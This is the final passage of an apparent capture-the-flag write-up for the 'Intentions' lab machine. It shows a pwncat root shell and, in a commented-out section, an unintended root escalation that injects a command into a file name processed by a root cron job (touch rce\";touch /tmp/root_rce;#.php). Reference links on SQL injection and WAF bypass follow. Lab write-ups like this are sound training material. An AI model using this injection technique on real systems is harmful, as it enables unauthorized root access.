```bash
> pc root@intentions.htb -i id_rsa.root
[11:32:58] Welcome to pwncat 🐈!                                                                    __main__.py:164
[11:33:00] intentions.htb:22: registered new host w/ db                                              manager.py:957
(local) pwncat$
(remote) root@intentions:/root# id
uid=0(root) gid=0(root) groups=0(root)
```

**Pwned!!**
<!-- ![Pwned](https://i.imgur.com/DhUp7Bw.png) -->

<!-- ## Unintended escalation to root

Checking for background processes with `pspy` only found two cleanup scripts being executed by root. One of these runs the`rm` command against a wildcard

```bash
2023/07/16 10:30:01 CMD: UID=0     PID=75211  | /bin/bash /root/scripts/clean2.sh
2023/07/16 10:30:01 CMD: UID=0     PID=75212  | /usr/bin/find /var/www/html/intentions/storage/app/public -type f -name *.php -exec rm {} ;
2023/07/16 10:30:01 CMD: UID=0     PID=75213  | /usr/bin/find /var/www/html/intentions/public/ -type f -not -name index.php -name *.php -exec rm {} ;
```

Created a file with a payload in the filename to create a file in the /tmp directory. Once the cronjob is run, there's a file in `/tmp` owned by root

By creating a file with a payload embedded in the filename, it's possible to trigger the creation of a file owned by root. Once the cronjob is executed, a file owned by the root user will appear in the `/tmp` directory, confirming code execution as root

```
$ cd /var/www/html/intentions/storage/app/public
$ touch rce\";touch /tmp/root_rce;#.php
$ ls -la /tmp/root_rce
-rw-r--r-- 1 root root 0 Jul 16 16:48 /tmp/root_rce
``` -->

## References

- [SQL injection (second order) - PortSwigger](https://portswigger.net/kb/issues/00100210_sql-injection-second-order)
- [SQLMap Tamper Scripts (SQL Injection and WAF bypass) - Starter Zone - Bugcrowd Forum](https://forum.bugcrowd.com/t/sqlmap-tamper-scripts-sql-injection-and-waf-bypass/423)
- [Second Order SQLI: Automating with sqlmap · Jorge Lajara Website](https://jlajara.gitlab.io/Second_order_sqli)
- [Bypassing Web Application Firewalls with SQLMap Tamper Scripts](https://web.archive.org/web/20171224101008/https://www.websec.ca/blog/view/Bypassing_WAFs_with_SQLMap)
- [SQLMap Tamper Scripts (SQL Injection and WAF bypass) Tips | by Dragon Security | Medium](https://medium.com/@drag0n/sqlmap-tamper-scripts-sql-injection-and-waf-bypass-c5a3f5764cb3)
- [Exploiting Arbitrary Object Instantiations in PHP without Custom Classes – PT SWARM](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)
- [Exploiting Linux Capabilities – Part 2](https://tbhaxor.com/exploiting-linux-capabilities-part-2/)
- [capabilities(7) - Linux manual page](https://man7.org/linux/man-pages/man7/capabilities.7.html)
